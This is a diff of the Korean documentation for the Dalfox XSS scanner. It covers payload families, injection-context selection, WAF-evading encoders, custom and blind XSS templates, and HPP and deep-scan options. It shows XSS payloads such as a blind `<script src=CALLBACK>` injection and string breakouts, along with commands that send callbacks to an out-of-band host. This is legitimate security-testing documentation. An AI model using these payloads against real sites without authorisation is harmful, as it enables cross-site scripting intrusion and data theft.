@@ -21,7 +21,7 @@ Dalfox는 여러 계열로부터 페이로드를 구성합니다:
 | **URL protocol** | `javascript:alert(1)` | `href`/`src` 계열 속성 |
 | **CSP bypass** | `strict-dynamic` 스크립트 가젯, nonce 재사용, 허용된 호스트의 JSONP | 응답에 우회 가능한 CSP가 있을 때 |
 | **mXSS** | `<foreignobject>`/DOMPurify 우회 | 새니타이저가 변형한 DOM |
-| **Blind** | `<script src=//callback/></script>` | `--blind`가 설정된 경우 |
+| **Blind** | `"'><script src=CALLBACK></script>` | `-b`/`--blind` 또는 `--blind-oob`가 설정된 경우 |
 
 각 페이로드 템플릿은 마커(`class={CLASS}` 또는 `id={ID}`)를 지니고 있어, 검증 단계에서 DOM 내에서 자신의 요소를 확실하게 식별할 수 있습니다.
 
@@ -29,11 +29,11 @@ Dalfox는 여러 계열로부터 페이로드를 구성합니다:
 
 탐색 중 Dalfox는 각 파라미터를 **주입 컨텍스트**, 즉 반사된 값이 도달하는 위치에 따라 분류합니다:
 
-- HTML 본문 → HTML/속성 브레이크아웃 페이로드
-- 따옴표로 감싼 속성 내부 → 속성 브레이크아웃 페이로드
-- `<script>` 내부 → JS 브레이크아웃 페이로드
-- `<style>` 내부 → CSS 페이로드
-- 알 수 없음 → HTML + 속성의 폴백 조합
+- HTML 본문 → HTML 태그, mXSS, DOM 클로버링 페이로드 (값이 HTML 주석 안에 들어가면 `-->…<!--`로 감쌈)
+- 따옴표로 감싼 속성 내부 → 속성 브레이크아웃과 스스로 실행되는 이벤트 핸들러 페이로드. URL 프로토콜 페이로드를 가장 먼저 보냄
+- `<script>` 내부 → 문자열 구분자 브레이크아웃(`'-alert(1)-'`, `${alert(1)}` 등)과 `</script>` 태그 브레이크아웃
+- `<style>` 내부 → `</style>` 브레이크아웃 뒤에 HTML 태그
+- 알 수 없음 → HTML, 속성, mXSS, DOM 클로버링, URL 프로토콜 페이로드를 번갈아 섞은 조합
 
 덕분에 적중률은 높이면서 요청 수는 적정선으로 유지합니다.
 
@@ -71,7 +71,7 @@ Dalfox는 여러 계열로부터 페이로드를 구성합니다:
 인코더는 *동일한 페이로드*를 여러 형태로 변환하여, WAF와 서버 측 필터가 모두 같은 바이트를 보지 않도록 합니다.
 
 ```bash
-dalfox https://target.app -e url,html,base64
+dalfox scan https://target.app -e url,html,base64
 ```
 
 사용 가능한 인코더:
@@ -89,30 +89,30 @@ dalfox https://target.app -e url,html,base64
 | `unicode` | 전각(fullwidth) 매핑 |
 | `zwsp` | 폭 없는 공백(zero-width space) 삽입 |
 
-기본값: `url,html`. 목록에 `none`을 추가하면, Dalfox는 원시 페이로드만 보냅니다.
+기본값: `url,html`. 원시 페이로드는 항상 함께 전송되므로, 활성화된 인코더마다 기본 페이로드당 변형이 하나씩 늘어납니다(기본값이면 페이로드마다 세 가지 형태로 보냅니다). 목록에 `none`을 추가하면, Dalfox는 원시 페이로드만 보냅니다.
 
 ## 커스텀 페이로드
 
-한 줄에 하나씩, 직접 만든 목록을 제공합니다:
+한 줄에 하나씩, 직접 만든 목록을 제공합니다. 빈 줄과 `#`으로 시작하는 줄은 건너뜁니다:
 
 ```bash
-dalfox https://target.app --custom-payload mypayloads.txt
+dalfox scan https://target.app --custom-payload mypayloads.txt
 ```
 
 로컬 내장 라이브러리 대신 사용자 지정 파일을 사용합니다:
 
 ```bash
-dalfox https://target.app --custom-payload mypayloads.txt --only-custom-payload
+dalfox scan https://target.app --custom-payload mypayloads.txt --only-custom-payload
 ```
 
-사용자 지정 파일이 로컬 반사 및 DOM 검사의 기본 페이로드가 됩니다. 적응형 합성과 CSP/기술 공유 페이로드는 추가하지 않습니다. 인코더와 WAF 변형은 사용자 지정 항목에서 파생되며, 명시적으로 요청한 `--remote-payloads`는 계속 사용됩니다.
+`--custom-payload` 없이 `--only-custom-payload`만 주면 거부되며, 쓸 수 있는 줄이 하나도 없는 파일도 마찬가지입니다. 사용자 지정 파일이 로컬 반사 및 DOM 검사의 기본 페이로드가 됩니다. 적응형 합성과 CSP/기술 공유 페이로드는 추가하지 않습니다. 인코더와 WAF 변형은 사용자 지정 항목에서 파생되며, 명시적으로 요청한 `--remote-payloads`는 계속 사용됩니다.
 
 ## 원격 페이로드 소스
 
 커뮤니티 워드리스트를 필요할 때 가져옵니다:
 
 ```bash
-dalfox https://target.app --remote-payloads portswigger,payloadbox
+dalfox scan https://target.app --remote-payloads portswigger,payloadbox
 ```
 
 지원되는 소스: `portswigger`, `payloadbox`. 실행마다 한 번 가져오며, `--proxy`와 `--timeout`을 준수합니다.
@@ -159,6 +159,8 @@ dalfox payload functions | grep -i prompt
 dalfox payload special-chars | wc -l
 ```
 
+`--json`을 붙이면 JSON 배열로 출력합니다(`dalfox payload all --json`은 모든 로컬 그룹을 하나의 배열로 합치고, 셀렉터 없이 `dalfox payload --json`을 실행하면 셀렉터별 개수를 출력합니다).
+
 `special-chars` 그룹은 수동 반사 테스트에 유용합니다. 각 바이트를 하나씩 주입해 어떤 문자가
 그대로 반사되는지, 어떤 문자가 HTML/URL 인코딩되어 돌아오는지, 어떤 문자가 제거되는지 확인할 수
 있습니다. `functions`와 `awesome-alert`는 *눈으로* 실행을 확인하고 호스트/오리진을 표시하도록
@@ -169,7 +171,7 @@ dalfox payload special-chars | wc -l
 전형적인 `alert(1)`은 요란할 수 있습니다. 이를 교체하면 곳곳에서 대화 상자를 띄우지 않고도 영향(impact)을 입증할 수 있습니다:
 
 ```bash
-dalfox https://target.app \
+dalfox scan https://target.app \
   --custom-alert-value "document.domain" \
   --custom-alert-type str
 ```
@@ -182,32 +184,36 @@ dalfox https://target.app \
 Blind XSS는 나중에, 직접 볼 수 없는 컨텍스트(관리자 패널, 지원 담당자의 대시보드)에서 발동합니다. 대역 외(out-of-band) 리스너가 필요합니다:
 
 ```bash
-dalfox https://target.app -b https://your-callback.interact.sh
+dalfox scan https://target.app -b https://your-callback.interact.sh
 ```
 
 커스텀 blind 템플릿:
 
 ```bash
-dalfox https://target.app \
+dalfox scan https://target.app \
   -b https://your-callback.example \
   --custom-blind-xss-payload blind-templates.txt
-# 각 줄에는 {} 가 포함될 수 있음(콜백 URL로 치환됨)
+# 각 줄에는 {callback}이 있어야 함(콜백 URL로 치환됨)
 ```
+
+`{callback}`이 들어 있는 줄만 사용되며, 나머지 줄은 경고와 함께 건너뜁니다. `#` 주석과 빈 줄은 무시합니다. 리터럴 `{}`는 그대로 두므로 템플릿에 `()=>{}` 같은 JavaScript를 넣을 수 있습니다. 그래서 `dalfox payload blind`가 출력하는 `{}` 스켈레톤을 여기에 쓰려면 `{}`를 `{callback}`으로 바꿔야 합니다. 쓸 수 있는 줄이 하나도 없으면 내장 템플릿으로 대체합니다.
+
+직접 운영하는 콜백 서버가 없다면 `--blind-oob`가 interactsh에 등록하고 콜백을 직접 폴링합니다. [빠른 시작](../../getting-started/quick-start/)을 참고하세요.
 
 ## HTTP 파라미터 오염(HPP)
 
 일부 필터는 파라미터의 *첫 번째* 등장만 검사합니다. Dalfox는 파라미터를 중복시켜 페이로드를 두 번째 슬롯에 밀어 넣을 수 있습니다:
 
 ```bash
-dalfox https://target.app --hpp
+dalfox scan https://target.app --hpp
 ```
 
 ## Deep scan
 
-기본적으로 Dalfox는 검증된 페이로드를 찾으면 해당 파라미터에 대한 테스트를 중단합니다. `--deep-scan`은 계속 진행합니다:
+기본적으로 Dalfox는 검증된 페이로드를 찾으면 해당 파라미터에 대한 테스트를 중단합니다. `--deep-scan`은 계속 진행하며, 파라미터당 기본 페이로드 3000개라는 내장 상한도 해제합니다([CLI 레퍼런스](../../reference/cli/)의 `--max-payloads-per-param` 참고):
 
 ```bash
-dalfox https://target.app --deep-scan
+dalfox scan https://target.app --deep-scan
 ```
 
 연구에는 유용하지만, 프로덕션 파이프라인에서는 더 느립니다.
